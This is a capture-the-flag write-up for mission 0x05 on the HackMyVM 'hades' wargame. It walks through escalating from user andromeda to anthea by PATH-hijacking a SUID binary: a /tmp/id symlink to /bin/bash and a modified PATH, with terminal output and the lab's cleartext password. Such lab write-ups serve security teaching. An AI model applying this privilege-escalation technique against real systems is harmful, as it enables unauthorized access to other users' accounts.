# 0x05
This write-up explains the steps taken to complete mission 0x05 on hades@hackmyvm.eu, starting from user `andromeda` and escalating to `anthea`.

## Mission
As always, read the mission:
```bash
andromeda@hades:~$ cat mission.txt 
################
# MISSION 0x05 #
################

## EN ##
The user anthea reminds us who we are.
```
The mission for this stage focused on identity and a hint about "who we are".

## Method of solving (Path Hijacking)
In the home directory, we find a binary named `uid` with **SUID** permissions and a restricted password file `anthea_pass.txt`.
```bash
andromeda@hades:~$ ls -la
total 52
drwxr-x--- 2 root      andromeda  4096 Apr  5  2024 .
drwxr-xr-x 1 root      root       4096 Apr  5  2024 ..
-rw-r--r-- 1 andromeda andromeda   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 andromeda andromeda  3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 andromeda andromeda   807 Apr 23  2023 .profile
-r--r----- 1 anthea    anthea       21 Apr  5  2024 anthea_pass.txt
-rw-r----- 1 root      andromeda    22 Apr  5  2024 flagz.txt
-rw-r----- 1 root      andromeda   166 Apr  5  2024 mission.txt
-rwS--s--- 1 root      andromeda 16056 Apr  5  2024 uid
```

The binary `uid` is designed to display user identity information, presumably by calling the system's `id` command.
By observing its behavior and the mission hint, we suspect it is calling `id` as a relative command rather than using an absolute path like `/usr/bin/id`. This allow for a **PATH Hijacking** attack.

We create a symbolic link named `id` in the `/tmp` directory that pointed directly to `/bin/bash`.
```bash
andromeda@hades:~$ ln -s /bin/bash /tmp/id
```

We modify the `$PATH` environment variable to include `/tmp` at the very beginning. This ensures that when system looks for a command named `id`, it finds our link in `/tmp` before the legitimate utility in `/usr/bin/`.
```bash
andromeda@hades:~$ PATH=/tmp:$PATH
andromeda@hades:~$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

When we executed the `./uid` binary, it attempted to run `id`. Because the `PATH` variable had been modified, it executed `/bin/bash` instead. Since the binary had the **SUID** bit set, the resulting shell granted us privileges of the `anthea` user.
```bash
andromeda@hades:~$ ./uid 
anthea@hades:~$ 
```
**Explanation**:

- **SUID (Set User ID)**: When a file has the SUID bit set, it runs with the permissions of the file owner (or a specifically configured user) rather than the user who started it.
- **Relative Path Vulnerability**: If a privileged program calls another program (like id) without specifying the full directory path, an attacker can manipulate the $PATH variable to execute a different, malicious file with the same name.
Once we obtain the shell as anthea, we are able to read the cleartext password file.
```bash
anthea@hades:~$ cat anthea_pass.txt 
yWFLtSNQArEBTHtWgkKd
```
With the retrieved password, we successfully logged in via SSH to establish a clean session.
```bash
anthea@hades:~$ ssh anthea@localhost
...
anthea@localhost's password: 
...
anthea@hades:~$ id ; whoami
uid=2047(anthea) gid=2047(anthea) groups=2047(anthea)
anthea
```

## Key command
`ln -s /bin/bash /tmp/id`

`PATH=/tmp:$PATH`

***You are welcome!***

